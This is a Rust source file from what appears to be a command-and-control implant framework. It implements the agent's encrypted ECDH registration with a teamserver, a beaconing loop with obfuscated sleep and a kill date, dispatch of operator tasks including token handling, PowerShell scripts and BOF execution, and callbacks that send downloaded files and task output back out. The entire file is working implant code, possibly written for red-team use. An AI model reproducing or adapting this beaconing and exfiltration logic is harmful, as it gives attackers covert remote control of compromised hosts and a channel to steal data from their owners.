use red_cell_common::agent_protocol::serialize_init_metadata;
use red_cell_common::demon::{DemonCommand, DemonMessage, DemonPackage};
use tracing::{info, warn};

use super::SpecterAgent;
use crate::dispatch::{self, DispatchResult};
use crate::ecdh::{
    EcdhSession, decode_listener_pub_key, perform_registration, send_session_packet,
};
use crate::error::SpecterError;

impl SpecterAgent {
    /// Perform the ECDH registration handshake (replaces `init_handshake`).
    pub(super) async fn ecdh_init_handshake(&mut self) -> Result<(), SpecterError> {
        let key_str = self
            .config
            .listener_pub_key
            .as_deref()
            .ok_or(SpecterError::InvalidConfig("listener_pub_key required for ECDH"))?;
        let listener_pub_key = decode_listener_pub_key(key_str)?;

        let metadata = self.collect_metadata();
        let metadata_bytes = serialize_init_metadata(self.agent_id, &metadata)
            .map_err(|e| SpecterError::Transport(format!("ECDH metadata encode: {e}")))?;

        let session =
            perform_registration(self.transport.primary(), &listener_pub_key, &metadata_bytes)
                .await
                .map_err(|e| SpecterError::Transport(format!("ECDH registration: {e}")))?;

        info!(agent_id = format_args!("0x{:08X}", session.agent_id), "ECDH registration complete");

        self.agent_id = session.agent_id;
        self.ecdh_session = Some(session);
        Ok(())
    }

    /// Send packages over the ECDH session and return decrypted response bytes.
    async fn ecdh_send_packages(
        &mut self,
        packages: Vec<DemonPackage>,
    ) -> Result<Vec<u8>, SpecterError> {
        let (connection_id, session_key, agent_id) = self
            .ecdh_session
            .as_ref()
            .ok_or_else(|| SpecterError::Transport("ECDH session not initialized".into()))
            .map(|s| (s.connection_id, s.session_key, s.agent_id))?;
        let msg_bytes = DemonMessage::new(packages)
            .to_bytes()
            .map_err(|e| SpecterError::Transport(format!("ECDH message encode: {e}")))?;

        // seq_num(8 LE) | DemonMessage — server rejects packets with seq ≤ last seen.
        let seq = self.callback_seq;
        let mut payload = Vec::with_capacity(8 + msg_bytes.len());
        payload.extend_from_slice(&seq.to_le_bytes());
        payload.extend_from_slice(&msg_bytes);

        let result = send_session_packet(
            self.transport.primary(),
            &EcdhSession { connection_id, session_key, agent_id },
            &payload,
        )
        .await;

        // Always advance — see Phantom's ecdh_send_packages for rationale.
        self.callback_seq += 1;
        result
    }

    /// ECDH-mode checkin + job fetch in one session packet.
    async fn ecdh_checkin_and_get_job(&mut self) -> Result<DemonMessage, SpecterError> {
        let packages = vec![
            DemonPackage::new(DemonCommand::CommandCheckin, 0, Vec::new()),
            DemonPackage::new(DemonCommand::CommandGetJob, 0, Vec::new()),
        ];
        let response = self.ecdh_send_packages(packages).await?;
        if response.is_empty() {
            return Ok(DemonMessage::default());
        }
        DemonMessage::from_bytes(&response)
            .map_err(|e| SpecterError::Transport(format!("ECDH job parse: {e}")))
    }

    /// ECDH-mode single-package callback (for responses to dispatched tasks).
    async fn ecdh_send_raw_callback(
        &mut self,
        command_id: u32,
        request_id: u32,
        payload: &[u8],
    ) -> Result<(), SpecterError> {
        let pkg = DemonPackage { command_id, request_id, payload: payload.to_vec() };
        let _resp = self.ecdh_send_packages(vec![pkg]).await?;
        Ok(())
    }

    /// Main ECDH run loop (used instead of `run` when listener_pub_key is set).
    pub(super) async fn run_ecdh_loop(&mut self) -> Result<(), SpecterError> {
        loop {
            if self.reached_kill_date() {
                info!(
                    agent_id = format_args!("0x{:08X}", self.agent_id),
                    kill_date = ?self.config.kill_date,
                    "kill date reached — notifying teamserver and exiting"
                );
                let _ = self
                    .ecdh_send_raw_callback(u32::from(DemonCommand::CommandKillDate), 0, &[])
                    .await;
                return Ok(());
            }

            let delay = self.compute_sleep_delay();
            crate::sleep_obf::obfuscated_sleep(delay, self.config.sleep_technique).await;

            let message = match self.ecdh_checkin_and_get_job().await {
                Ok(m) => m,
                Err(e) => {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        error = %e,
                        "ecdh checkin failed, will retry"
                    );
                    continue;
                }
            };

            for package in &message.packages {
                let result = dispatch::dispatch(
                    package,
                    &mut self.config,
                    &mut self.token_vault,
                    &mut self.downloads,
                    &mut self.mem_files,
                    &mut self.job_store,
                    &mut self.ps_scripts,
                    &self.bof_output_queue,
                );
                if self.handle_ecdh_dispatch_result(package.request_id, result).await {
                    return Ok(());
                }
            }

            let fs_cmd_id = u32::from(DemonCommand::CommandFs);
            let download_packets = self.downloads.push_chunks(fs_cmd_id);
            for pkt in download_packets {
                if let Err(e) =
                    self.ecdh_send_raw_callback(pkt.command_id, pkt.request_id, &pkt.payload).await
                {
                    warn!(error = %e, "ecdh: failed to send download chunk");
                }
            }

            let bof_responses = self.drain_bof_output();
            for resp in bof_responses {
                if let Err(e) = self
                    .ecdh_send_raw_callback(resp.command_id, resp.request_id, &resp.payload)
                    .await
                {
                    warn!(error = %e, "ecdh: failed to send BOF callback");
                }
            }

            let tracked_dead = self.job_store.poll();
            let job_cmd_id = u32::from(DemonCommand::CommandJob);
            for (job_id, request_id) in &tracked_dead {
                let mut payload = Vec::with_capacity(8);
                payload.extend_from_slice(
                    &u32::from(red_cell_common::demon::DemonJobCommand::Died).to_le_bytes(),
                );
                payload.extend_from_slice(&job_id.to_le_bytes());
                if let Err(e) = self.ecdh_send_raw_callback(job_cmd_id, *request_id, &payload).await
                {
                    warn!(job_id, error = %e, "ecdh: failed to send job-died notification");
                }
            }
            self.job_store.reap_dead();
        }
    }

    /// Process one dispatch result in ECDH mode. Returns `true` if agent should exit.
    async fn handle_ecdh_dispatch_result(
        &mut self,
        request_id: u32,
        result: DispatchResult,
    ) -> bool {
        match result {
            DispatchResult::Ignore => false,
            DispatchResult::Exit => {
                info!(
                    agent_id = format_args!("0x{:08X}", self.agent_id),
                    "CommandExit received — terminating"
                );
                true
            }
            DispatchResult::Respond(resp) => {
                let rid = if resp.request_id != 0 { resp.request_id } else { request_id };
                if let Err(e) =
                    self.ecdh_send_raw_callback(resp.command_id, rid, &resp.payload).await
                {
                    warn!(command_id = resp.command_id, error = %e, "ecdh: failed to send response");
                }
                false
            }
            DispatchResult::MultiRespond(resps) => {
                for resp in resps {
                    let rid = if resp.request_id != 0 { resp.request_id } else { request_id };
                    if let Err(e) =
                        self.ecdh_send_raw_callback(resp.command_id, rid, &resp.payload).await
                    {
                        warn!(command_id = resp.command_id, error = %e, "ecdh: failed to send response");
                    }
                }
                false
            }
        }
    }
}
